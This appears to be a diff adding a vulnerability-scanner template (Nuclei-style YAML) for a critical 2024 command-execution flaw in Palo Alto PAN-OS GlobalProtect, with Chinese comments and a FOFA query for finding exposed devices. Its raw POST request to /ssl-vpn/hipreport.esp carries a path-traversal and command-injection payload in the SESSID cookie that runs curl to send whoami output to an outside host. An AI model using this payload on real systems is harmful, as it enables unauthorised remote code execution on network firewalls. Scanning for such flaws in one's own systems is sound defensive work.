@@ -1,0 +1,43 @@
+id: poc-ohrh67vuzrm67hmi
+info:
+  name: Palo Alto Networks PAN-OS 命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ohrh67vuzrm67hmi'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ohrh67vuzrm67hmi
+    fofa: app="PaloAlto-GlobalProtect"
+http:
+- raw:
+  - 'POST /ssl-vpn/hipreport.esp HTTP/1.1
+
+
+    Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/minute/y`curl${IFS}www.baidu.com?test=$(whoami)`;
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
